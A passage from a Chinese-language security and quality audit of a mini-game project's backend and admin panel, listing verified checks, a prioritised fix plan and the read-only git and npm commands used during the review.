- **路由守卫**：`router/index.js:114-125` 覆盖全部 13 条需登录路由；`meta.noAuth` 只用于 `/login`；未知路径经 vue-router 4.6.4 实测 `resolve()` 得到 `meta = {}`（不抛异常），未登录会被导向登录页；`App.vue` 先渲 `router-view` 再渲 `AdminLayout`，**不存在「先渲染后台数据再跳登录」的闪现**。
- **未登录能否直连 `/api/admin/*`**：不能。`back/src/routes/admin/**` 每个模块都挂了 `adminAuth`；用 express 复现挂载顺序确认 `requireRole('super')` 对 `PUT /users/:id/coins` 真实生效（normal → 403，super → 200），`/users/:id/ban` 按设计对 normal 开放。
- **敏感配置脱敏（服务端）**：用真实 `require-role.js` 复现 —— normal 角色 `GET /configs` 得到 `wechat.login_secret`/`ai.api_key` = `******`，super 得到原值；normal 角色 `PUT /configs` = 403。（**但这条复现只查了 `value` 字段，没有查 `config_value` —— 见 J-1，前端信任的正是 `value`，泄漏在另一个字段上。**）
- **循环导入**：`stores/auth.js → utils/request.js → stores/auth.js / router` 的环在 ESM live binding 下不产生 TDZ，已逐模块核对求值顺序。
- **构建与部署路径**：`vite.config.js:7` `base: '/admin/'`、路由 `createWebHistory('/admin/')`、`back/src/app.js:51-57` 的 `app.use('/admin', express.static(dist))` + `app.get('/admin/*')` 回退 index.html —— **三者一致**，路径可正确命中。API 走绝对路径 `/api/...`，`baseURL: ''` 正确。
- **依赖**：`npm audit`（含 dev）均为 **0 漏洞**；`package-lock.json` 与 `package.json` 一致，`axios@1.21.0 / vite@7.3.7 / vue@3.5.44 / element-plus@2.14.0 / echarts@6.1.0 / vue-echarts@8.3.2` 全部落在声明范围内。
- **接口契约对齐**：公告（`title/type/priority/content/status`）、道具（`imageUrl`）、福袋数据源（`endpointUrl/refreshIntervalSeconds/parserConfig`）、配置（`{configs:[{key,value}]}`）、统计（`dau/games/revenue`）逐项核对**一致**。
- **分页参数**：`page`/`limit` 均来自受控值，`el-input-number` 在 element-plus 2.14 内部 `verifyValue` 每次输入都夹紧，越界值发不出去。
- **头像审核**：审核是**全自动**的（上传 → 微信内容安全异步回调 → `applyEvent` 直接改 `users.avatar_url`，30 分钟未回调则 `expirePending` 回收），因此「管理后台没有头像审核页」不构成功能缺口。

---

## N. 修复优先级（建议执行顺序）

> 顺序原则：① 先止血（正在造成资损/泄露/崩溃的）→ ② 再保交付（版本控制、部署、测试红）→ ③ 再改质量。

### 第 0 步：先备份，别再丢东西（今天，30 分钟）

1. `tar -czf ~/jinli-backup-$(date +%F).tar.gz minigame/ assets-pkg/ config/` —— **这三个目录 0 文件入库**（F1 / E12 / M-2）。
2. 把整个工作区推到**私有**远端：`git remote add private <私有仓库>` → `git push private recovery/final-20260527`（E1）。

### 第 1 步：堵住正在流血的洞（本周）

| 顺序 | 动作 | 对应 |
|---|---|---|
| 1 | `mapConfig` 改为只返回白名单字段（去掉 `...row`） | **J-1** P0 |
| 2 | `ws` 服务端加 `maxPayload: 8 * 1024`、给 `upgrade` 非目标路径补 `socket.destroy()`、给 `connection` 回调包 try/catch、**加 `process.on('unhandledRejection')` 兜底** | **K-1 K-3 K-4** |
| 3 | `docker-compose.yml` 补挂 `012_daily_tasks.sql`、`013_game_duration_120.sql`，删掉 `011` | **H-1 / D1** P0 |
| 4 | 结算事务里的 `INSERT INTO daily_tasks` 改为失败可降级（进度写失败不应回滚金币） | **H-1** P0 |
| 5 | `.gitignore` 忽略 `config/operator.smoke.json`（或整个 `config/`）、`.scratch/`、`design-preview/`、`assets-pkg/`、`.i18n_work/`、`.superpowers/`、`.sisyphus/` | **B1 / E2** |
| 6 | 生产后端把 `require('../../../utils/legal-config')` 下沉到 `back/` 内 | **A1** |
| 7 | `tokenTtl` 从「秒」改成带单位（`${n}s`）或后端统一换算 | **J-2** |

### 第 2 步：让交付态可信（本周）

| 顺序 | 动作 | 对应 |
|---|---|---|
| 8 | `minigame/`、`minigame/package-lock.json`、`.github/`、`.nvmrc`、`PRODUCT.md`、`back/admin-web/src/utils/csv.js` 入库 | **F1 F2 M-2** |
| 9 | `assets-pkg/` 入库或加生成脚本 | **E12** |
| 10 | 修 `tests/daily-tasks-page.test.js` 断言（顺带把 C1 的回归写进去） | **C2** |
| 11 | 修 C1：`claimReward` 的 `claiming` 复位挪到 `loadTasks()` 之前，或在 `finally` 里重算 `disabled` | **C1 / I-3** |
| 12 | `.env.example` 补 `DEPLOYMENT_CHANNEL` / `TRIAL_USER_IDS` / `CORS_ORIGIN` / `OPENCODEGO_*` | **A2 / E8** |
| 13 | CI 改成「先 codegen → `git diff --exit-code` → 再跑三端测试」，并把 `minigame` 步骤提到消费方测试之前 | **L-3 / E6** |
| 14 | 生产 Node 升到 24（或把 `engines`/`.nvmrc` 降到 20 并重新评估） | **A3** |

### 第 3 步：功能与体验（下两周）

- 结算页 `switchTab` 补本地状态判断（I-1）；房间页 join 竞态的定时器泄漏（I-2）；音频 `onError` 不要清 BGM 引用（I-4）；退出登录写「主动退出」标记（I-5）；启动页把超时覆盖到 `fetchRemoteConfig`+`tryAutoLogin`（I-8）。
- `privacy.revoke()` 入口（I-7，合规）；「撤回隐私授权」按钮（I-7）。
- 小游戏端补 `/auth/refresh` 续期（L-1）；小游戏退出登录清本地战绩（L-5）。
- `leaveRoom` 的锁序倒置、状态校验、`current_players` 漂移（H-2 H-3 H-4）—— 这三条同时修。
- 管理后台：公告状态回归（M-1）、403 区分与角色门控（M-3）、金币显示用后端返回值（M-4）、筛选复位页码（M-5）、axios `params`（M-6）、CSV 公式注入（M-7）、日志结束日（M-8）、管理员弱口令（M-9）。

### 第 4 步：结构性（一个月）

- 引入迁移执行器 + 版本表（H-12）；修 `003` 的 AppID 空操作 upsert 并补增量迁移（H-7）。
- 统一时长事实源，清理 `011`/`013` 与文档矛盾（E11 / E13）；`game.round_duration` 等 7 个死配置要么接通要么删掉（E11）。
- 结算奖章个性化（H-5）；`users.level` 更新（H-6）；等级两端对齐（I-6）。
- 房间生命周期清理 + 列表分页（H-8）；建房失败恢复不依赖 DB（H-9）。
- 管理后台补测试（M-10）；后端补 `process.on('unhandledRejection')` 与 `NODE_ENV` 白名单（J-5）；`jscode2session` 加超时（J-6）；`TRUST_PROXY` 生产必配（J-7）。
- 清理死代码与三套实时实现收敛（K-0 / L-10a）。

---

## O. 附录：本次执行的只读命令

```bash
# 仓库状态
git status --porcelain                       # 288 项（287 原有 + 本报告）
git rev-list --left-right --count origin/main...HEAD
git cat-file -e origin/main:back/.env         # 公开仓库历史中仍存在
git ls-files minigame assets-pkg .github .nvmrc config | wc -l   # 全部为 0
git ls-tree -r -l HEAD | sort -k4 -n -r       # 130.6 MB 被跟踪资源
git check-ignore -v <path>                    # .scratch / config/operator.smoke.json 未被忽略
gh repo view 10434812/game_codex             # visibility: PUBLIC

# 测试
npm test                                     # 328 / 327 pass / 1 fail
cd back && npm test                          # 173 pass
cd minigame && npm test                      # 73 pass

# 发布检查
npm run release:check                        # 6 项禁止公开发布

# 复现脚本（只读，全部在 /tmp 下）
node /tmp/jinli-verify/tasks-repro.js .      # C1 / I-3
```





